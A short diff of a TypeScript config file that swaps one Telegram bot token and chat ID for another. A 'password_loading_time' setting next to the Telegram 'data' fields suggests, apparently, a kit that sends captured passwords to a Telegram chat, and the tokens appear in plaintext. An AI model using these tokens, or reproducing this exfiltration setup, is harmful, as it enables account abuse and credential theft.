@@ -6,8 +6,8 @@ interface Config {
     password_loading_time: number;
   };
   telegram: {
-    data_chatid: -1002426577751;
-    data_token: 7594014258:AAElVSGwpNAIUdT0y8PXtiup6Wf2GHs0-6c;
+    data_chatid: -1002348242568;
+    data_token: 7625292612:AAEg7yYNDaVSBH_AJDJcRQg2dJZWEZElyvU;
   };
 }
 const defaultConfig: Config = {
@@ -18,8 +18,8 @@ const defaultConfig: Config = {
     password_loading_time: 5000,
   },
   telegram: {
-    data_chatid: "-1002426577751",
-    data_token: "7594014258:AAElVSGwpNAIUdT0y8PXtiup6Wf2GHs0-6c",
+    data_chatid: "-1002348242568",
+    data_token: "7625292612:AAEg7yYNDaVSBH_AJDJcRQg2dJZWEZElyvU",
   },
 };
 const getConfig = (): Config => {
